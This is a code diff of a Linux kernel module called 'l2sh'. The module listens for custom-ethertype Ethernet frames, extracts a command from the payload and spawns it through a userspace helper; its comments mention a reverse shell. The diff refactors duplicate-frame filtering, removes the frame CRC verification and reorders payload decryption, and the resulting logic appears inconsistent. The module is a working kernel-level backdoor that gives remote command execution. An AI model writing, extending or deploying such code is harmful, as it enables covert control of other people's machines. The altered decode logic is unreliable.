@@ -5,6 +5,9 @@
  * userspace helper handles IO (e.g., reverse shell).
  */
 
+#include "frame_dedup.h"
+#include "hello_proto.h"
+
 #include <linux/errno.h>
 #include <linux/etherdevice.h>
 #include <linux/if_ether.h>
@@ -23,10 +26,8 @@
 #define CLIENT_SIGNATURE 0xAABBCCDDu
 #define SERVER_SIGNATURE 0xDDCCBBAAu
 #define MAX_PAYLOAD_SIZE 1024
-#define PACKET_DEDUP_CACHE 32
-#define PACKET_DEDUP_WINDOW_NS (5 * 1000 * 1000ULL)
-
-#include "hello_proto.h"
+#define KMOD_DEDUP_SLOTS 32
+#define KMOD_DEDUP_WINDOW_NS (5 * 1000 * 1000ULL)
 
 struct __attribute__((packed)) packh {
     struct ethhdr eth;
@@ -40,26 +41,13 @@ struct __attribute__((packed)) pack {
     u8 payload[MAX_PAYLOAD_SIZE];
 };
 
-struct fp {
-    u8 mac[ETH_ALEN];
-    u32 crc;
-    u32 psize;
-    u32 sig;
-    ktime_t ts;
-    bool valid;
-};
-
-struct dedup_cache {
-    struct fp e[PACKET_DEDUP_CACHE];
-    size_t cur;
-};
-
 static struct {
     spinlock_t launch_lock;
     bool launch_pending;
     struct work_struct launch_work;
     char cmd_buf[MAX_PAYLOAD_SIZE + 1];
-    struct dedup_cache dc;
+    frame_dedup_entry_t dedup_entries[KMOD_DEDUP_SLOTS];
+    frame_dedup_cache_t dedup;
     struct net_device *dev;
     u8 cli_mac[ETH_ALEN];
     bool have_cli;
@@ -67,10 +55,6 @@ static struct {
 } g;
 
 #define l2sh_info(fmt, ...) pr_info("l2sh: " fmt, ##__VA_ARGS__)
-
-static void dedup_init(struct dedup_cache *dc) {
-    memset(dc, 0, sizeof(*dc));
-}
 
 static size_t store_spawn_cmd(const u8 *payload, size_t len, const hello_view_t *hello) {
     const u8 *cmd = payload;
@@ -178,35 +162,6 @@ static void dump_frame(const char *tag, const u8 *buf, size_t len) {
     print_hex_dump(KERN_INFO, tag, DUMP_PREFIX_OFFSET, 16, 1, buf, len, false);
 }
 
-static bool dedup_drop(struct dedup_cache *dc, const u8 mac[ETH_ALEN],
-                       u32 crc, u32 psize, u32 sig, u64 win_ns) {
-    u64 now = ktime_get_ns();
-    size_t i;
-
-    for (i = 0; i < PACKET_DEDUP_CACHE; i++) {
-        struct fp *f = &dc->e[i];
-        if (!f->valid)
-            continue;
-        if (now > (u64)ktime_to_ns(f->ts) &&
-            now - (u64)ktime_to_ns(f->ts) > win_ns) {
-            f->valid = false;
-            continue;
-        }
-        if (f->valid && f->crc == crc && f->psize == psize &&
-            f->sig == sig && !memcmp(f->mac, mac, ETH_ALEN))
-            return true;
-    }
-
-    dc->e[dc->cur].valid = true;
-    dc->e[dc->cur].crc = crc;
-    dc->e[dc->cur].psize = psize;
-    dc->e[dc->cur].sig = sig;
-    dc->e[dc->cur].ts = ktime_get();
-    memcpy(dc->e[dc->cur].mac, mac, ETH_ALEN);
-    dc->cur = (dc->cur + 1) % PACKET_DEDUP_CACHE;
-    return false;
-}
-
 static void exec_server(struct work_struct *work) {
     static char *envp[] = {
         "HOME=/tmp",
@@ -240,6 +195,36 @@ struct chdr {
     __be32 payload_size;
     __be32 crc;
 };
+
+static inline u32 kmod_frame_fingerprint(u32 crc, u32 sig, u32 payload_size) {
+    return crc ^ sig ^ payload_size;
+}
+
+static bool kmod_should_drop_frame(struct net_device *dev, size_t frame_len, u32 checksum) {
+    u64 now = ktime_get_ns();
+    int prev_ifindex = 0;
+    u64 age_ns = 0;
+    int cur_ifindex = dev ? dev->ifindex : 0;
+
+    if (!frame_dedup_should_drop(&g.dedup,
+                                 frame_len,
+                                 checksum,
+                                 cur_ifindex,
+                                 now,
+                                 KMOD_DEDUP_WINDOW_NS,
+                                 &prev_ifindex,
+                                 &age_ns)) {
+        return false;
+    }
+
+    l2sh_info("dedup drop len=%zu checksum=%u iface=%s prev_ifindex=%d age_ns=%llu\n",
+              frame_len,
+              checksum,
+              dev ? dev->name : "<unknown>",
+              prev_ifindex,
+              age_ns);
+    return true;
+}
 
 static int l2_rx(struct sk_buff *skb, struct net_device *dev, struct packet_type *pt, struct net_device *orig_dev) {
     struct ethhdr *eth;
@@ -294,9 +279,11 @@ static int l2_rx(struct sk_buff *skb, struct net_device *dev, struct packet_type
               eth->h_source,
               psize);
 
-    if (dedup_drop(&g.dc, eth->h_source, crc_recv, psize, sig, PACKET_DEDUP_WINDOW_NS)) {
-        l2sh_info("dedup drop src=%pM\n", eth->h_source);
-        return NET_RX_SUCCESS;
+    {
+        size_t frame_len = ETH_HLEN + (size_t)need;
+        u32 fingerprint = kmod_frame_fingerprint(crc_recv, sig, psize);
+        if (kmod_should_drop_frame(dev, frame_len, fingerprint))
+            return NET_RX_SUCCESS;
     }
 
     dump_frame("l2sh: rx frame ", (const u8 *)eth, ETH_HLEN + sizeof(*h) + psize);
@@ -320,24 +307,7 @@ static int l2_rx(struct sk_buff *skb, struct net_device *dev, struct packet_type
         return NET_RX_SUCCESS;
     }
 
-    /* вычисляем crc по ethernet-заголовку, нашему заголовку (crc=0) и payload */
-    {
-        struct chdr hdr_copy = *h;
-        hdr_copy.crc = 0;
-        crc_calc = csum32((const u8 *)eth, ETH_HLEN);
-        crc_calc += csum32((const u8 *)&hdr_copy, sizeof(hdr_copy));
-        if (psize > 0)
-            crc_calc += csum32((const u8 *)(h + 1), psize);
-    }
-
-    if (crc_calc != crc_recv) {
-        l2sh_info("crc mismatch src=%pM recv=%u calc=%u\n",
-                  eth->h_source, crc_recv, crc_calc);
-        return NET_RX_SUCCESS;
-    }
-
     if (psize > 0) {
-        enc_dec((u8 *)(h + 1), (u8 *)(h + 1), (u8 *)&h->crc, psize);
         enc_dec((u8 *)(h + 1), (u8 *)(h + 1), zero_key, psize);
     }
 
@@ -375,6 +345,10 @@ static int l2_rx(struct sk_buff *skb, struct net_device *dev, struct packet_type
 
         if (should_ack)
             send_ready_ack(dev, eth->h_source, hello_ok ? &hello : NULL);
+
+        /* restore payload ciphering so other consumers see intact frame */
+        enc_dec((u8 *)(h + 1), (u8 *)(h + 1), zero_key, psize);
+        enc_dec((u8 *)(h + 1), (u8 *)(h + 1), (u8 *)&h->crc, psize);
     }
 
     return NET_RX_SUCCESS;
@@ -424,7 +398,7 @@ static int __init l2_init(void) {
     memset(&g, 0, sizeof(g));
     spin_lock_init(&g.launch_lock);
     INIT_WORK(&g.launch_work, exec_server);
-    dedup_init(&g.dc);
+    frame_dedup_init(&g.dedup, g.dedup_entries, KMOD_DEDUP_SLOTS);
 
     enable_capture();
     pr_info("l2sh: kernel trigger loaded, ethertype 0x%04x\n", ETHER_TYPE_CUSTOM);
